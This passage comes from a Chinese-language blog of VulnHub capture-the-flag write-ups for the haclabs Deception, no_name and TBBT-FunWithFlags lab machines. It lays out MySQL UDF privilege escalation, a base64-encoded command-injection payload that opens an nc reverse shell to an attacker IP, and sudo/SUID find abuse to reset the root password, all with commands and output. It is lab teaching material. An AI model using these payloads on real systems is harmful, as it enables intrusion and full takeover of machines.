class="code"><pre><span class="line">&quot;haclabs&quot;</span><br><span class="line">&quot;A&#x3D;123456789&quot;</span><br><span class="line">&quot;+A[::-1]&quot;</span><br></pre></td></tr></table></figure><p>尝试后得出账户haclabs的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su haclabs</span><br><span class="line">haclabs987654321</span><br></pre></td></tr></table></figure><p>切换至账户haclabs</p><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">haclabs987654321</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for haclabs on haclabs:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User haclabs may run the following commands on haclabs:</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure><p>sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -i</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),27(sudo)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>Mysql UDF提权</p></blockquote><p>拿到yash账户后提权遇到瓶颈，上传了脚本linuxprivchecker，运行过后报告可能存在Mysql的UDF提权的可能<br />查阅了相关资料之后发现几个问题</p><ul><li>需要root账户</li><li>secure_file_priv</li><li>plugin_dir</li></ul><p>可以先在wordpress的配置文件中获取账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;wp-config.php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ** MySQL settings - You can get this info from your web host ** &#x2F;&#x2F;</span><br><span class="line">&#x2F;** The name of the database for WordPress *&#x2F;</span><br><span class="line">define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database username *&#x2F;</span><br><span class="line">define( &#39;DB_USER&#39;, &#39;wordpressuser&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database password *&#x2F;</span><br><span class="line">define( &#39;DB_PASSWORD&#39;, &#39;cry4moon&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL hostname *&#x2F;</span><br><span class="line">define( &#39;DB_HOST&#39;, &#39;localhost&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** Database Charset to use in creating database tables. *&#x2F;</span><br><span class="line">define( &#39;DB_CHARSET&#39;, &#39;utf8&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** The Database Collate type. Don&#39;t change this if in doubt. *&#x2F;</span><br><span class="line">define( &#39;DB_COLLATE&#39;, &#39;&#39; );</span><br></pre></td></tr></table></figure><p>拿到账户之后再使用mysql客户端登入服务<br /><code>mysql -h localhost -u wordpressuser -pcry4moon</code><br />再查看root账户的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select host,user,authentication_string from mysql.user;</span><br><span class="line">+---------------+------------------+-------------------------------------------+</span><br><span class="line">| host          | user             | authentication_string                     |</span><br><span class="line">+---------------+------------------+-------------------------------------------+</span><br><span class="line">| localhost     | root             | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">| localhost     | mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span><br><span class="line">| localhost     | mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span><br><span class="line">| localhost     | debian-sys-maint | *2A702E4018EF99C245B5DC4E753531720BDC94E0 |</span><br><span class="line">| %             | haclabs          | *1565CEE976A27D283F4ECF1EC2AEE11E71C8D208 |</span><br><span class="line">| localhost     | phpmyadmin       | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">| wordpressuser | wordpress        | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">| localhost     | wordpress        | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">| localhost     | wordpressuser    | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">+---------------+------------------+-------------------------------------------+</span><br><span class="line">9 rows in set (0.20 sec)</span><br></pre></td></tr></table></figure><p>可以看到localhost账户的密码hash和wordpressuser的一样，即都是<code>cry4moon</code><br />但是无法登入，测试时重新设置了密码，操作如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">update mysql.user set authentication_string&#x3D;PASSWORD(&quot;cry4moon&quot;) where user&#x3D;&#39;root&#39;;</span><br><span class="line">update mysql.user set plugin&#x3D;&quot;mysql_native_password&quot;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>完成更改密码之后即可以root账户登入</p><p>而UDF提权则需要在插件目录写入文件，关于目录可以用以下命令查阅</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;plugin_dir&#39;;</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">| Variable_name | Value                  |</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">| plugin_dir    | &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F; |</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">1 row in set (0.07 sec)</span><br></pre></td></tr></table></figure><p>即<code>/usr/lib/mysql/plugin/</code></p><p>而在写入文件时会发生错误，原因是<code>secure_file_priv</code>参数对于文件写入存在限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br><span class="line">+------------------+-----------------------+</span><br><span class="line">| Variable_name    | Value                 |</span><br><span class="line">+------------------+-----------------------+</span><br><span class="line">| secure_file_priv | &#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F; |</span><br><span class="line">+------------------+-----------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>即只能写入目录<code>/var/lib/mysql-files/</code>，子目录下也不行</p><ul><li>若该值为空，则无限制</li><li>若该值为NULL，则不可写入</li></ul><p>提权需要将文件作为插件写入plugin_dir，但与参数<code>secure_file_priv</code>冲突，故写入时会报错。而参数<code>secure_file_priv</code>为只读参数，不能再mysql客户端中更改，只能修改mysqld.cnf，写入&quot;secure_file_priv=&quot;，并且重启mysql服务，才能继续进行UDF提权。</p><p>之后发生玄学运维，手动修改了secure_file_priv参数，权限777的路径写入文件会报错权限否认，手动移动的so文件可以载入但是不能执行命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#39;&#x2F;tmp&#x2F;udf.so&#39;));</span><br><span class="line">select * from foo into dumpfile &#39;%plugin_dir%&#x2F;udf.so&#39;;</span><br><span class="line">create function sys_eval returns string soname &#39;udf2.so&#39;;</span><br><span class="line">select sys_eval(&#39;id&#39;);</span><br></pre></td></tr></table></figure><p>linux下的so文件与windows下的dll文件在MSF中都有附带</p><p>参考资料</p><blockquote><p><a href="https://www.hacknos.com/haclabs-deception-walkthrough-vulnhub/">WP</a><br /><a href="https://blog.csdn.net/qq_36119192/article/details/84863268">UDF</a><br /><a href="https://www.cnblogs.com/mrhonest/p/10836621.html">UDF</a><br /><a href="https://www.cnblogs.com/Tdazheng/p/10742929.html">Mysql.pass</a></p></blockquote><hr /><h1 id="no_name"><a class="markdownIt-Anchor" href="#no_name"></a> <a href="https://www.vulnhub.com/entry/haclabs-no_name,429/">no_name</a></h1><p><code>2020/03/27 01:05:37</code></p><h2 id="端口扫描-13"><a class="markdownIt-Anchor" href="#端口扫描-13"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -T5 -sV -A -n -v 192.168.31.196</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.196</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 78:2b:f7:57:bf:da:fd:ec:e0:d5:60:c4:8b:53:62:fd (RSA)</span><br><span class="line">|   256 36:82:4a:8b:71:f7:78:da:49:42:f9:88:6d:26:73:6a (ECDSA)</span><br><span class="line">|_  256 dc:18:8e:b3:36:53:cb:10:34:98:57:3d:f0:a1:2b:ad (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;UTF-8).</span><br><span class="line">MAC Address: 08:00:27:59:63:EF (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 18.412 days (since Sun Mar  8 03:06:40 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;261 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-13"><a class="markdownIt-Anchor" href="#web路径枚举-13"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.31.196/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.196&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.196&#x2F;admin (CODE:200|SIZE:417)                                            </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.196&#x2F;index.php (CODE:200|SIZE:201)                                        </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.196&#x2F;server-status (CODE:403|SIZE:279)</span><br></pre></td></tr></table></figure><p>访问<code>/index.php</code></p><ul><li>显示<code>Fake Admin Area</code></li><li>任意提交查询则回显<code>Fake ping executed</code></li></ul><p>访问<code>/admin</code></p><ul><li>有四个图片文件</li><li>源代码中有提示信息<code>passphrase:harder</code></li></ul><h2 id="漏洞利用-13"><a class="markdownIt-Anchor" href="#漏洞利用-13"></a> 漏洞利用</h2><p>使用<code>steghide</code>工具进行分析<br />发现图片文件<code>haclabs.jpeg</code>存在隐写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf haclabs.jpeg  -p harder</span><br><span class="line">wrote extracted data to &quot;imp.txt&quot;.</span><br><span class="line">cat imp.txt </span><br><span class="line">c3VwZXJhZG1pbi5waHA&#x3D;</span><br><span class="line">echo &quot;c3VwZXJhZG1pbi5waHA&#x3D;&quot; | base64 -d</span><br><span class="line">superadmin.php</span><br></pre></td></tr></table></figure><p>访问<code>/superadmin.php</code></p><ul><li>存在ping功能</li></ul><p>尝试进行命令注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">| cat superadmin.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">   if (isset($_POST[&#39;submitt&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">   $word&#x3D;array(&quot;;&quot;,&quot;&amp;&amp;&quot;,&quot;&#x2F;&quot;,&quot;bin&quot;,&quot;&amp;&quot;,&quot; &amp;&amp;&quot;,&quot;ls&quot;,&quot;nc&quot;,&quot;dir&quot;,&quot;pwd&quot;);</span><br><span class="line">   $pinged&#x3D;$_POST[&#39;pinger&#39;];</span><br><span class="line">   $newStr &#x3D; str_replace($word, &quot;&quot;, $pinged);</span><br><span class="line">   if(strcmp($pinged, $newStr) &#x3D;&#x3D; 0)</span><br><span class="line">&#123;</span><br><span class="line">    $flag&#x3D;1;</span><br><span class="line">&#125;</span><br><span class="line">       else</span><br><span class="line">&#123;</span><br><span class="line">   $flag&#x3D;0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($flag&#x3D;&#x3D;1)&#123;</span><br><span class="line">$outer&#x3D;shell_exec(&quot;ping -c 3 $pinged&quot;);</span><br><span class="line">echo &quot;$outer&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>有两种获取shell的方法</p><ul><li>使用wget下载php一句话木马</li><li>使用nc反弹shell</li></ul><p>过滤可以使用base64编码进行绕过<br /><code>|echo &quot;xxxx&quot;|base64 -d|bash</code><br />xxxx即为要执行的命令的base64编码的结果</p><p><strong>wget</strong><br />写入文件失败，可能没有权限</p><p><strong>nc</strong></p><p>监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9900</span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nc.traditional -e &#x2F;bin&#x2F;bash 192.168.31.10 9900&quot; | base64</span><br><span class="line">bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMzEuMTAgOTkwMAo&#x3D;</span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|echo &quot;bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMzEuMTAgOTkwMAo&#x3D;&quot;|base64 -d|bash</span><br></pre></td></tr></table></figure><p>接收到反弹shell</p><h2 id="权限提升-13"><a class="markdownIt-Anchor" href="#权限提升-13"></a> 权限提升</h2><p>获取pty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>在yash的home目录发现flag1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;yash&#x2F;flag1.txt</span><br><span class="line">Due to some security issues,I have saved haclabs password in a hidden file.</span><br></pre></td></tr></table></figure><p>搜索拥有者为yash的文件/文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user yash 2&gt; &#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;home&#x2F;yash</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;flag1.txt</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.bashrc</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.cache</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.cache&#x2F;motd.legal-displayed</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.profile</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.bash_history</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.gnupg</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.gnupg&#x2F;private-keys-v1.d</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.local</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.local&#x2F;share</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.local&#x2F;share&#x2F;nano</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;hidden</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;hidden&#x2F;.passwd</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;share&#x2F;hidden&#x2F;.passwd</span><br><span class="line">haclabs1234</span><br></pre></td></tr></table></figure><p>切换账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su haclabs</span><br><span class="line">haclabs1234</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for haclabs on haclabs:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User haclabs may run the following commands on haclabs:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;find</span><br></pre></td></tr></table></figure><p>可以使用find命令进行提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root find &#x2F;etc&#x2F;passwd -exec passwd root \;</span><br><span class="line">hackforfun</span><br><span class="line">hackforfun</span><br><span class="line">su root</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>SUID-find</p></blockquote><p>其实在<code>www-data</code>权限时就可以使用find命令进行操作</p><p>查看SUID</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;find</span><br></pre></td></tr></table></figure><p>可以通过find命令来进行读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F;etc&#x2F;passwd -exec ls -la &#x2F;root \;</span><br><span class="line"></span><br><span class="line">total 40</span><br><span class="line">drwx------  6 root root 4096 Feb 15 16:28 .</span><br><span class="line">drwxr-xr-x 25 root root 4096 Mar 26 17:07 ..</span><br><span class="line">-rw-------  1 root root   41 Mar 26 17:22 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc</span><br><span class="line">drwx------  2 root root 4096 Jan 30 06:53 .cache</span><br><span class="line">drwx------  5 root root 4096 Jan 30 03:06 .config</span><br><span class="line">drwx------  3 root root 4096 Jan 27 16:46 .gnupg</span><br><span class="line">drwxr-xr-x  3 root root 4096 Jan 27 16:56 .local</span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">-rw-r--r--  1 root root   97 Jan 30 04:29 flag3.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F;etc&#x2F;passwd -exec cat &#x2F;root&#x2F;flag3.txt \;</span><br><span class="line"></span><br><span class="line">Congrats!!!You completed the challenege!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   ()    ()</span><br><span class="line"></span><br><span class="line"> \      &#x2F;</span><br><span class="line">  ----------</span><br></pre></td></tr></table></figure><p>但是通过find来命令执行时存在限制的，并不是完全以root账户的身份去执行</p><p>在本地测试之后得出如下结论</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读取：***</span><br><span class="line">写入：**2</span><br><span class="line">执行：**4(bash); 1**, *1*, **1(exec)</span><br></pre></td></tr></table></figure><ul><li>*** 分别代表权限的三位，其中*为通配，表示任意权限</li><li>**2， linux中的权限可以线性叠加，**2即代表需要仅写权限，在**3, **6, **7的情况下也是适用的</li><li>bash意为该文件作为bash的参数来执行(bash <a href="http://run.sh">run.sh</a>)，exec则表示作为可执行程序来执行(./run.sh)</li></ul><p>由此看来应当是继承了root的r-x权限，但是直接获取bash则还是以原用户的身份来获取，并不能获取root权限的bash；也不能通过passwd来修改root账户的密码(即使euid=0)</p><blockquote><p>nc.traditional/nc</p></blockquote><ul><li>nc.traditional是最早的版本(v1.10-41.1)，该版本具有<code>-e</code>的选项，用于反弹shell十分方便</li><li>ubuntu中的nc命令则会指向netcat-openbsd，而该版本则没有<code>-e</code>的选项，无法用于反弹shell</li><li>ncat的版本则比较新，集成于nmap中</li></ul><p>参考资料</p><blockquote><p><a href="https://www.runoob.com/linux/linux-shell.html">exec</a><br /><a href="https://www.hacknos.com/haclabs-no_name-walkthrough-vulnhub-ctf/">WP</a><br /><a href="https://www.sqlsec.com/2019/10/nc.html">nc</a></p></blockquote><h1 id="tbbt-funwithflags"><a class="markdownIt-Anchor" href="#tbbt-funwithflags"></a> <a href="https://www.vulnhub.com/entry/tbbt-funwithflags,437/">TBBT-FunWithFlags</a></h1><p><code>2020/03/31 13:24:54</code></p><blockquote><p>靶机未启用DHCP，故使用了默认的静态IP:192.168.1.105。若本机网段不是192.168.1.*，需要在VB中创建一个192.168.1.*网段的Host-Only Ethernet Adapter</p></blockquote><h2 id="端口扫描-14"><a class="markdownIt-Anchor" href="#端口扫描-14"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -A -sV -T5 -n -v 192.168.1.105</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.1.105</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp   open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           539 Mar 04 01:11 Welcome.txt</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           114 Mar 04 01:13 ftp_agreement.txt</span><br><span class="line">|_drwxr-xr-x    9 ftp      ftp          4096 Mar 04 01:09 pub</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.1.3</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 1</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu 